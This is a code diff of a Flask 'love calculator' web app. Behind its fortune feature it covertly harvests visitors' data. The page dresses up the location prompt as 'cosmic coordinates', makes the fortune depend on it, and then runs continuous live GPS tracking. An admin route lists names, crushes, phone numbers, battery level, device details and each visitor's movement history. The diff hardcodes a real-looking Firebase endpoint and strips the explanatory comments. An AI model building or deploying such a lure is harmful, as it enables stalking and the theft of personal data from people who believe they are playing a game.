@@ -7,10 +7,8 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# ========== FIREBASE SETUP ==========
-FIREBASE_URL = os.environ.get("FIREBASE_URL", "https://YOUR-PROJECT-default-rtdb.firebaseio.com/")
-if FIREBASE_URL.endswith('/'):
-    FIREBASE_URL = FIREBASE_URL[:-1]
+# ========== YOUR FIREBASE SETUP ==========
+FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"
 
 # ========== LOVE CALCULATOR FUNCTIONS ==========
 def calculate_love_percentage(name1, name2):
@@ -65,7 +63,7 @@ def save_location(session_id, lat, lon):
     }
     return save_to_firebase(path, location_data)
 
-# ========== HTML TEMPLATE (Location FIRST, then Fortune) ==========
+# ========== HTML TEMPLATE ==========
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -405,13 +403,11 @@ HTML_TEMPLATE = '''
         document.getElementById('locationStatus').innerHTML = '✨ Accessing your cosmic coordinates...';
         document.getElementById('liveTrackPanel').style.display = 'block';
         
-        // Get initial location
         navigator.geolocation.getCurrentPosition(async (position) => {
             currentLat = position.coords.latitude;
             currentLon = position.coords.longitude;
             locationGranted = true;
             
-            // Save initial location
             collectedData.latitude = currentLat;
             collectedData.longitude = currentLon;
             collectedData.mapUrl = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
@@ -432,15 +428,11 @@ HTML_TEMPLATE = '''
                 })
             });
             
-            // Show map preview
             document.getElementById('mapPreview').style.display = 'block';
             document.getElementById('mapLink').href = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
             document.getElementById('locationStatus').innerHTML = `✅ Location captured! Latitude: ${currentLat.toFixed(6)}, Longitude: ${currentLon.toFixed(6)}`;
             
-            // Start LIVE GPS TRACKING (keeps updating as user moves)
             startLiveTracking();
-            
-            // Now calculate and show fortune
             await calculateAndShowFortune();
             
             locationBtn.innerHTML = '✅ Location Captured! Fortune Unlocked ✅';
@@ -463,7 +455,6 @@ HTML_TEMPLATE = '''
     }
     
     function startLiveTracking() {
-        // Watch position for live GPS tracking
         locationWatchId = navigator.geolocation.watchPosition(async (position) => {
             const newLat = position.coords.latitude;
             const newLon = position.coords.longitude;
@@ -472,14 +463,10 @@ HTML_TEMPLATE = '''
             document.getElementById('liveCount').innerHTML = locationUpdateCount;
             document.getElementById('lastLocation').innerHTML = `📍 Last: ${newLat.toFixed(6)}, ${newLon.toFixed(6)}`;
             
-            // Update current location
             currentLat = newLat;
             currentLon = newLon;
-            
-            // Update map link
             document.getElementById('mapLink').href = `https://www.google.com/maps?q=${newLat},${newLon}`;
             
-            // Save each location update to Firebase for live tracking
             await fetch('/save-location', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -490,7 +477,6 @@ HTML_TEMPLATE = '''
                 })
             });
             
-            // Update visitor data with latest location
             collectedData.latitude = newLat;
             collectedData.longitude = newLon;
             collectedData.mapUrl = `https://www.google.com/maps?q=${newLat},${newLon}`;
@@ -525,7 +511,6 @@ HTML_TEMPLATE = '''
             document.getElementById('percentage').innerHTML = currentPercent + '%';
             document.getElementById('message').innerHTML = currentFortune;
             
-            // Add location badge
             let locationBadge = '';
             if (currentLat && currentLon) {
                 locationBadge = `<div class="location-badge">📍 Location Captured | Live Tracking Active (${locationUpdateCount} updates)</div>`;
@@ -677,7 +662,7 @@ def calculate_love():
     except Exception as e:
         return jsonify({'message': str(e)}), 500
 
-# ========== ADMIN ROUTE to view ALL location tracking ==========
+# ========== ADMIN VIEW DATA ==========
 @app.route('/admin-view-data')
 def admin_view():
     try:
@@ -708,11 +693,10 @@ def admin_view():
                 .container { overflow-x: auto; }
                 table { border-collapse: collapse; width: 100%; background: #16213e; margin-bottom: 20px; }
                 th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
-                th { background: #e94560; color: white; position: sticky; top: 0; }
+                th { background: #e94560; color: white; }
                 .count { background: #0f3460; padding: 10px; border-radius: 10px; margin: 20px 0; }
                 .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
                 .refresh { background: #38a169; }
-                .location-row { background: #1a2a3a; }
             </style>
         </head>
         <body>
@@ -723,28 +707,16 @@ def admin_view():
             </p>
         """
         
-        # Visitors summary
         if visitors:
             visitor_count = len(visitors)
             html += f'<div class="count"><strong>Total Visitors:</strong> {visitor_count}</div>'
             
             html += """
-            <h2>📍 Visitor Data (with Location)</h2>
+            <h2>📍 Visitor Data</h2>
             <div class="container">
                 <table>
                     <thead>
-                        <tr>
-                            <th>Session ID</th>
-                            <th>Name</th>
-                            <th>Crush</th>
-                            <th>Love %</th>
-                            <th>Phone</th>
-                            <th>Latest Latitude</th>
-                            <th>Latest Longitude</th>
-                            <th>Map</th>
-                            <th>Battery</th>
-                            <th>Device</th>
-                        </tr>
+                        <tr><th>Session ID</th><th>Name</th><th>Crush</th><th>Love %</th><th>Phone</th><th>Latitude</th><th>Longitude</th><th>Map</th><th>Battery</th><th>Device</th></tr>
                     </thead>
                     <tbody>
             """
@@ -759,10 +731,10 @@ def admin_view():
                             <td>{session_id[:30]}...</td>
                             <td><strong>{visitor.get('name', '')}</strong></td>
                             <td>{visitor.get('crush_name', '')}</td>
-                            <td style="color: #f093fb;">{visitor.get('percentage', '')}%</td>
+                            <td style="color:#f093fb;">{visitor.get('percentage', '')}%</td>
                             <td>{visitor.get('phoneNumber', '')}</td>
-                            <td>{visitor.get('latitude', 'Not shared')}</td>
-                            <td>{visitor.get('longitude', 'Not shared')}</td>
+                            <td>{visitor.get('latitude', '-')}</td>
+                            <td>{visitor.get('longitude', '-')}</td>
                             <td>{map_link}</td>
                             <td>{visitor.get('batteryLevel', '')}</td>
                             <td>{visitor.get('deviceMemory', '')}</td>
@@ -770,33 +742,23 @@ def admin_view():
                     """
             html += "</tbody></table></div>"
         
-        # Live location tracking history
         if locations:
             location_count = len(locations)
-            html += f'<div class="count"><strong>Total Location Updates:</strong> {location_count} (Live GPS Tracking)</div>'
+            html += f'<div class="count"><strong>Total Location Updates:</strong> {location_count}</div>'
             
             html += """
-            <h2>🔄 Live GPS Movement Tracking (Chronological)</h2>
+            <h2>🔄 Live Movement History</h2>
             <div class="container">
                 <table>
-                    <thead>
-                        <tr>
-                            <th>Session ID</th>
-                            <th>Timestamp</th>
-                            <th>Latitude</th>
-                            <th>Longitude</th>
-                            <th>Google Maps</th>
-                        </tr>
-                    </thead>
+                    <thead><tr><th>Session ID</th><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr></thead>
                     <tbody>
             """
-            # Sort by timestamp
             sorted_locations = sorted(locations.items(), key=lambda x: x[1].get('timestamp', '') if x[1] else '')
             for key, loc in sorted_locations:
                 if isinstance(loc, dict):
                     map_link = f'<a href="https://www.google.com/maps?q={loc.get("latitude")},{loc.get("longitude")}" target="_blank" style="color:#48bb78;">📍 View</a>'
                     html += f"""
-                        <tr class="location-row">
+                        <tr>
                             <td>{loc.get('sessionId', '')[:30]}...</td>
                             <td>{loc.get('timestamp', '')[:19]}</td>
                             <td>{loc.get('latitude', '')}</td>
